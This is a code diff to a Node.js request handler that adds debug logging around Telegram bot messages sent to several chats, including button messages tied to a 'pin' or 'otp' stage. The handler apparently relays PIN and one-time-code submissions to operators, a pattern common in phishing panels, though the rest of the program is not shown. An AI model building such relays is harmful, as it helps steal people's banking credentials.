@@ -156,19 +156,22 @@ module.exports = async (req, res) => {
     await Promise.allSettled(
       uniqueRecipients.map(async (chatId) => {
         try {
+          console.log('📤 Calling sendMessage to', chatId, 'with token length:', BOT_TOKEN.length);
           const mainMsg = await sendMessage(BOT_TOKEN, chatId, text);
+          console.log('📤 sendMessage response:', mainMsg);
           mainMessages.push({ c: mainMsg.chat.id, m: mainMsg.message_id });
-          console.log('📤 Sent main message to', chatId);
+          console.log('✅ Sent main message to', chatId, 'message_id:', mainMsg.message_id);
 
           const buttonsText = stage === 'pin' ? buildPinButtonsText() : buildOtpButtonsText();
           const btnMsg = await sendMessage(BOT_TOKEN, chatId, buttonsText, {
             parse_mode: 'HTML',
             reply_markup: keyboardWithId,
           });
+          console.log('📤 button sendMessage response:', btnMsg);
           buttonMessages.push({ c: btnMsg.chat.id, m: btnMsg.message_id });
-          console.log('📤 Sent button message to', chatId);
+          console.log('✅ Sent button message to', chatId, 'message_id:', btnMsg.message_id);
         } catch (err) {
-          console.error('❌ Failed to send to', chatId, err.message);
+          console.error('❌ Failed to send to', chatId, err.message, err);
         }
       })
     );
